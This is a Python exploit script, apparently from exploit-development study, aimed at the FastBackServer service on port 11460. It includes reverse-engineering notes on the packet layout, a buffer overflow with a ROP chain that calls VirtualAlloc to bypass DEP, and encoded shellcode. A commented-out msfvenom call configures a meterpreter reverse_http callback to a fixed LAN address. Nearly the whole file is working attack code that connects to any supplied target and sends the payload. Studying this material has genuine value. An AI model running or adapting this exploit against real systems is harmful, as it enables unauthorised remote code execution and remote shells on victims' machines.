"""
===============================================================
======================= - Breakpoints - =======================
===============================================================
        bp wsock32!recv
        bp FastBackServer!FX_AGENT_CopyReceiveBuff+0x1f6
        bp FastBackServer!FX_AGENT_Cyclic+0xD0
        bp FastBackServer!FXCLI_OraBR_Exec_Command
        bp FastBackServer!FXCLI_OraBR_Exec_Command+0x43b
        bp FastBackServer!FXCLI_OraBR_Exec_Command+0x4c7
        bp FastBackServer!FXCLI_OraBR_Exec_Command+0x6ac
        bp FastBackServer!FXCLI_SetConfFileChunk+0x40
===============================================================
================= - Packet/Buffer Structure - =================
===============================================================
        0x00       : Checksum DWORD
        0x04 - 0x34: psAgentCommand
                    - 0x04 - 0xC:  ??
                    - 0x10:         Opcde
                    - 0x14:         Offset for copy operation
                    - 0x18:         Size of copy operation
                    - 0x1C:         Offset for 2nd copy operation
                    - 0x20:         Size of 2nd copy operation
                    - 0x24:         Offset for 3rd copy operation
                    - 0x28:         Size of 3rd copy operation
                    - 0x2C - 0x34: ??
        0x34 - End:  psCommandBuffer

# # Checksum
# buf = pack(">i", 0x2330)

# # psAgentCommand
# buf += bytearray([0x41] * 0x10)
# buf += pack("<i", 0x0)                # 1st memcpy: offset
# buf += pack("<i", 0x1000)             # 1st memcpy: size
# buf += pack("<i", 0x0)                # 2nd memcpy: offset
# buf += pack("<i", 0x1000)             # 2nd memcpy: size
# buf += pack("<i", -0x11000)           # 3rd memcpy: offset
# buf += pack("<i", 0x13000)            # 3rd memcpy: size
# buf += bytearray([0x41] * 0x8)

# # psCommandBuffer
# buf += bytearray([0x45] * 0x100)      # 1st Buffer
# buf += bytearray([0x45] * 0x200)      # 2nd Buffer
# buf += bytearray([0x45] * 0x2000)     # 3rd Buffer
===============================================================

Used MSF-PATTERN_CREATE, found eip at offset 276
                         found esp at offset 280

BAD_CHARS = [0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20]
"""

import socket
import sys
from struct import pack

from colorama import Fore, Style, init
from modules.msfvenom_module import generatePayload
from numpy import byte

init()

# Checksum
buf = bytearray()  # Checksum DWORD        0x00 - 0x04

# psAgentCommand
buf += bytearray([0x41] * 0xC)  # psAgentCommand        0x04 - 0x34
buf += pack("<i", 0x534)  # Opcode                0x10
buf += pack("<i", 0x0)  # 1st memcpy: offset    0x14
buf += pack("<i", 0x500)  # 1st memcpy: size      0x18
buf += pack("<i", 0x0)  # 2nd memcpy: offset    0x1C
buf += pack("<i", 0x100)  # 2nd memcpy: size      0x20
buf += pack("<i", 0x0)  # 3rd memcpy: offset    0x24
buf += pack("<i", 0x100)  # 3rd memcpy: size      0x28
buf += bytearray([0x41] * 0x8)  # N/A                   0x2C - 0x34


# psCommandBuffer

VirtualAlloc = pack("<L", (0x45454545))  # Dummy VirtualAlloc Addr
VirtualAlloc += pack("<L", (0x46464646))  # Dummy VirtualAlloc Ret
VirtualAlloc += pack("<L", (0x47474747))  # Dummy Shellcode Addr
VirtualAlloc += pack("<L", (0x48484848))  # Dummy dwSize
VirtualAlloc += pack("<L", (0x49494949))  # Dummy flAllocationType
VirtualAlloc += pack("<L", (0x51515151))  # Dummy flProtect

offset = b"A" * (276 - len(VirtualAlloc))
eip = pack("<L", (0x50501110))  # CSFTPAV6.dll -> PUSH ESP; PUSH EAX; POP EDI; POP ESI; RET | This got me into the stack for exec

# NOTE:: POP requires the value to loaded in  the next 4 bytes to work
# For example, to load ECX with -1
# 0xFFFFFFFF must be the next value right after our POP ECX instruction as the POP instruction increments ESI by 4

# VirtualAlloc(lpVoid lpAddress, size_t dwSize, dword flAllocationType, dword flProtect)
# lpAddress = shellcode addr
# dwSize = 0x1
# flAllocationType = 0x1000 (MEM_COMMIT)
# flProtect = 0x40 (PAGE_EXECUTE_READWRITE)

# ROP Chain to write VirtualAlloc IAT address into ESI
rop = pack("<L", (0x5050118E))  #             MOV EAX, ESI; POP ESI; RETN | Store VirtualAlloc IAT(VA_IAT) into EAX
rop += pack("<L", (0x42424242))  # junk, added for alignment | Filler for POP ESI
rop += pack("<L", (0x505115A3))  #      -> POP ECX, RET; | Load offset into ECX
rop += pack("<L", (0xFFFFFFE4))  # -0x1c | Load ECX with -28
rop += pack("<L", (0x5051579A))  #      -> ADD EAX, ECX; RET | Adjust EAX by subtracting ECX
rop += pack("<L", (0x50537D5B))  #      -> PUSH EAX; POP ESI; RET | Store VirtualAlloc IAT into ESI
rop += pack("<L", (0x5053A0F5))  #      -> POP EAX; RET | Prepare to load VA_IAT + 1
rop += pack("<L", (0x5054A221))  #      -> VirtualAlloc IAT + 1 | Store Manually incremented VA_IAT on stack
rop += pack("<L", (0x505115A3))  #      -> POP ECX; RET | Load -1 into ECX
rop += pack("<L", (0xFFFFFFFF))  #      -> mov -1 into ecx | Store -1 on stack for prevInstrcution
rop += pack("<L", (0x5051579A))  #      -> ADD EAX, ECX; RET | Add -1 to EAX, gets true VA_IAT
rop += pack("<L", (0x5051F278))  #      -> MOV EAX, dw [EAX]; RET | store dereferenced VA_IAT (VirtualAlloc Addr) into EAX
rop += pack("<L", (0x5051CBB6))  #      -> MOV dw [ESI], EAX; RET | store VirtualAlloc Addr into ESI (overwrite IAT)
# bp ladned me here -^
# writing return address for VirtualAlloc
rop += pack("<L", (0x50522FA7))  #      -> INC ESI, add al, 2B; RET | increment ESI
rop += pack("<L", (0x50522FA7))  #      -> INC ESI, add al, 2B; RET | increment ESI
rop += pack("<L", (0x50522FA7))  #      -> INC ESI, add al, 2B; RET | increment ESI
rop += pack("<L", (0x50522FA7))  #      -> INC ESI, add al, 2B; RET | increment ESI
rop += pack("<L", (0x5050118E))  #      -> MOV EAX, ESI ; POP ESI ; RET | Save ESI in EAX, then POP stack into ESI
rop += pack("<L", (0x42424242))  # junk, added for alignment | Filler for POP ESI
rop += pack("<L", (0x5052F773))  #      -> PUSH EAX; POP ESI; RET | Stock into EAX, pop next 4 bytes into ESI
rop += pack("<L", (0x505115A3))  #      -> POP ECX; RET | Load -0x210 into ECX
rop += pack("<L", (0xFFFFFDF0))  # -0x210 | Load ECX with -0x210
rop += pack("<L", (0x50533BF4))  #      -> SUB EAX, ECX; RET | Small dummy positive offset to EAX, will point to shellcode
rop += pack("<L", (0x5051CBB6))  #      -> MOV dw [ESI], EAX; RET | overwrite dummy shellcode with real shellcode address
# reached here
# fetching & writing lpAddress (shellcode addr) to ESI
# bp 0x5051CBB6
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5050118E))  # mov eax, esi ; pop esi ; ret
rop += pack("<L", (0x42424242))  # junk
rop += pack("<L", (0x5052F773))  # push eax ; pop esi ; ret
rop += pack("<L", (0x505115A3))  # pop ecx ; ret
rop += pack("<L", (0xFFFFFDF4))  # -0x20c
rop += pack("<L", (0x50533BF4))  # sub eax, ecx ; ret
rop += pack("<L", (0x5051CBB6))  # mov dword [esi], eax ; ret

# fetching & writing dwSize (0x1) to ESI
# bp 0x5051CBB6
# reached here
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5053A0F5))  # pop eax ; ret
rop += pack("<L", (0xFFFFFFFF))  # -1 value that is negated
rop += pack("<L", (0x50527840))  # neg eax ; ret
rop += pack("<L", (0x5051CBB6))  # mov dword [esi], eax ; ret

# fetching & writing flAllocationType (0x1000) to ESI
# bp 0x5051579a ".if (@eax & 0x0`ffffffff) = 0x80808080 {} .else {gc}"
# reached here
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5053A0F5))  # pop eax ; ret
rop += pack("<L", (0x80808080))  # first value to be added
rop += pack("<L", (0x505115A3))  # pop ecx ; ret
rop += pack("<L", (0x7F7F8F80))  # second value to be added
rop += pack("<L", (0x5051579A))  # add eax, ecx ; ret
rop += pack("<L", (0x5051CBB6))  # mov dword [esi], eax ; ret

# fetching & writing flProtect (0x40) to ESI
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522FA7))  # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5053A0F5))  # pop eax ; ret
rop += pack("<L", (0x80808080))  # first value to be added
rop += pack("<L", (0x505115A3))  # pop ecx ; ret
rop += pack("<L", (0x7F7F7FC0))  # second value to be added
rop += pack("<L", (0x5051579A))  # add eax, ecx ; ret
rop += pack("<L", (0x5051CBB6))  # mov dword [esi], eax ; ret
# rop += pack("<L", (0x50549417))  # push eax ; call esi      <- problem section
# reason: gadget was INT3; PUSH EAX; CALL ESI
#         only the INT3 was critical, not the rest
#         therefore the entire gadget can be removed
#         when not debugging


# Align stack for VirtualAlloc Exec
# bp 0x5050118e ".if @eax = 0x40 {} .else {gc}"
rop += pack("<L", (0x5050118E))  # mov eax, esi; pop esi; ret
rop += pack("<L", (0x42424242))  # junk, added for alignment | Filler for POP ESI
rop += pack("<L", (0x505115A3))  # pop ecx; ret
rop += pack("<L", (0xFFFFFFE8))  # -0x18 | Load ECX with -0x18
rop += pack("<L", (0x5051579A))  # add eax, ecx; ret | Adjust EAX to point to start of shellcode
rop += pack("<L", (0x5051571F))  # xchg eax, ebp; ret | Set EBP to point to start of shellcode, which will be used as stack for VirtualAlloc
rop += pack("<L", (0x50533CBF))  # mov esp, ebp; pop ebp; ret | Set ESP to point to start of shellcode, prepare for VirtualAlloc call

# Calculated padding to align with return address
padding = b"C" * 0xE0
shellcode = b"\xcc" * (0x600 - 276 - 4 - len(rop) - len(padding))
# increased from 0x400 to 0x600 when using msfvenom
# shellcode = generatePayload(
#     payload="windows/meterpreter/reverse_http",
#     LHOST="192.168.18.137",
#     LPORT=443,
#     bad_chars="\x00\x09\x0a\x0b\x0c\x0d\x20",
#     encoder="x86/shikata_ga_nai",
#     arch="x86",
#     platform="windows",
#     debug=True,
# )
shellcode = b""
shellcode += b"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\x3f\x98\xce\xc8\x83\xee\xfc"
shellcode += b"\xe2\xf4\xc3\x70\x4c\xc8\x3f\x98\xae\x41\xda"
shellcode += b"\xa9\x0e\xac\xb4\xc8\xfe\x43\x6d\x94\x45\x9a"
shellcode += b"\x2b\x13\xbc\xe0\x30\x2f\x84\xee\x0e\x67\x62"
shellcode += b"\xf4\x5e\xe4\xcc\xe4\x1f\x59\x01\xc5\x3e\x5f"
shellcode += b"\x2c\x3a\x6d\xcf\x45\x9a\x2f\x13\x84\xf4\xb4"
shellcode += b"\xd4\xdf\xb0\xdc\xd0\xcf\x19\x6e\x13\x97\xe8"
shellcode += b"\x3e\x4b\x45\x81\x27\x7b\xf4\x81\xb4\xac\x45"
shellcode += b"\xc9\xe9\xa9\x31\x64\xfe\x57\xc3\xc9\xf8\xa0"
shellcode += b"\x2e\xbd\xc9\x9b\xb3\x30\x04\xe5\xea\xbd\xdb"
shellcode += b"\xc0\x45\x90\x1b\x99\x1d\xae\xb4\x94\x85\x43"
shellcode += b"\x67\x84\xcf\x1b\xb4\x9c\x45\xc9\xef\x11\x8a"
shellcode += b"\xec\x1b\xc3\x95\xa9\x66\xc2\x9f\x37\xdf\xc7"
shellcode += b"\x91\x92\xb4\x8a\x25\x45\x62\xf0\xfd\xfa\x3f"
shellcode += b"\x98\xa6\xbf\x4c\xaa\x91\x9c\x57\xd4\xb9\xee"
shellcode += b"\x38\x67\x1b\x70\xaf\x99\xce\xc8\x16\x5c\x9a"
shellcode += b"\x98\x57\xb1\x4e\xa3\x3f\x67\x1b\x98\x6f\xc8"
shellcode += b"\x9e\x88\x6f\xd8\x9e\xa0\xd5\x97\x11\x28\xc0"
shellcode += b"\x4d\x59\xa2\x3a\xf0\x0e\x60\x2d\x94\xa6\xca"
shellcode += b"\x3f\x99\x75\x41\xd9\xf2\xde\x9e\x68\xf0\x57"
shellcode += b"\x6d\x4b\xf9\x31\x1d\xba\x58\xba\xc4\xc0\xd6"
shellcode += b"\xc6\xbd\xd3\xf0\x3e\x7d\x9d\xce\x31\x1d\x57"
shellcode += b"\xfb\xa3\xac\x3f\x11\x2d\x9f\x68\xcf\xff\x3e"
shellcode += b"\x55\x8a\x97\x9e\xdd\x65\xa8\x0f\x7b\xbc\xf2"
shellcode += b"\xc9\x3e\x15\x8a\xec\x2f\x5e\xce\x8c\x6b\xc8"
shellcode += b"\x98\x9e\x69\xde\x98\x86\x69\xce\x9d\x9e\x57"
shellcode += b"\xe1\x02\xf7\xb9\x67\x1b\x41\xdf\xd6\x98\x8e"
shellcode += b"\xc0\xa8\xa6\xc0\xb8\x85\xae\x37\xea\x23\x3e"
shellcode += b"\x7d\x9d\xce\xa6\x6e\xaa\x25\x53\x37\xea\xa4"
shellcode += b"\xc8\xb4\x35\x18\x35\x28\x4a\x9d\x75\x8f\x2c"
shellcode += b"\xea\xa1\xa2\x3f\xcb\x31\x1d"

buffer = offset + VirtualAlloc + eip + rop + padding + shellcode

buf += b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (buffer, 0, 0, 0, 0)
buf = pack(">i", len(buf) - 4) + buf  # Checksum DWORD        0x00 - 0x04


def printBuffer(buf, width="db"):
    if width == "db":
        w = 1
        groups_per_line = 16
    elif width == "dw":
        w = 2
        groups_per_line = 8
    elif width == "dd":
        w = 4
        groups_per_line = 4
    else:
        print(f"ERR: Invalid width {width}")
        exit(-1)
    bytes_per_line = groups_per_line * w
    for i in range(0, len(buf), bytes_per_line):
        print(
            Fore.YELLOW + f"\t" + f"{i:04x} - {min(i+bytes_per_line, len(buf)):04x}: " + Style.RESET_ALL,
            end="",
        )
        for g in range(groups_per_line):
            start = i + g * w
            if start >= len(buf):
                break
            if width == "db":
                for j in range(w):
                    if start + j < len(buf):
                        print(f"{buf[start+j]:02x}", end=" ")
                    else:
                        print("  ", end="")
            else:
                val = 0
                for j in range(w):
                    if start + j < len(buf):
                        val |= buf[start + j] << (8 * (w - 1 - j))
                if width == "dw":
                    print(f"{val:04x}", end=" ")
                elif width == "dd":
                    print(f"{val:08x}", end=" ")
        print()


def main():
    if len(sys.argv) != 2:
        print(f"ERR: No ip addr provided")
        exit(-1)

    server = sys.argv[1]
    port = 11460

    print(Fore.CYAN + f"o IP Addr: {server}:{port}" + Style.RESET_ALL)

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server, port))

        print(Fore.CYAN + f"o Sending Buffer ({len(buf)} bytes): " + Style.RESET_ALL)
        printBuffer(buf, width="dd")
        s.send(buf)
        s.close()

        sys.exit(0)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] User requested shutdown" + Style.RESET_ALL)
        sys.exit(1)


if __name__ == "__main__":
    main()
